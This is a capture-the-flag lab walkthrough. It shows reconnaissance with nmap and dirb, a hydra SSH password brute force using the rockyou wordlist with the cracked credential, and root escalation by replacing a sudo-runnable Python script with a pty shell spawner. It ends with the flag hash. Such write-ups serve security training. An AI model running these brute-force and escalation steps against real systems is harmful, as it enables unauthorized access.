# Information Gathering
> nmap -A $TARGET > nmapres.txt

port 80 open, so let's check it.
  * View page source :
  * on nmap resaults: *http-robots.txt: 1 disallowed entry*

Every link has a href to homepage '<a href="#">' --> xss is not a good choice

lets find other dirs:
> dirb http://$TARGET /usr/share/wordlists/dirb/common.txt
found 3 resaults:
'''
	==> DIRECTORY: http://10.10.42.55/images/                                                          
	+ http://10.10.42.55/index.html (CODE:200|SIZE:5439)                                               
	+ http://10.10.42.55/robots.txt (CODE:200|SIZE:33)                                                 
	+ http://10.10.42.55/server-status (CODE:403|SIZE:299) 
'''
We can conclude there's something on robots.txt:
'''
	User-agent: rockyou 
	Disallow: /
'''
rockyou is the wordlist we use for weak common passwords
user-agent would be a username mentioned somewhere

SMB is closed to find users; So we have to find it manually

back to homepage :
> Posted on June 29th 2009 by **meliodas**

lets hydra meliodas : rockyou.txt on ssh
> hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
Found!!!
[22][ssh] host: 10.10.42.55   login: meliodas   password: iloveyou1

---

Now we logged in as meliodas in the machine,
lets ls the home dir of meliodas

'''
	-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
	-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
'''
we have the user flag.

# Root flag

let's see what bak.py does;
It backups the whole website in /var/backups
but it requiers some root privilages
so let's see what we can do with sudo
> sudo -l
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

We can run the bak.py script as root
so let's write a script to give us shell access; But bak.py is -rw-r--r-- so it's write-protected. The solution is EZ! just remove and write again

> rm bak.py
> nano bak.py ( # vim wasn't there!!!)
'''
import pty

pty.spawn("/bin/sh")

'''
now if we run it we have a root tty and we can read root flag
> # cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617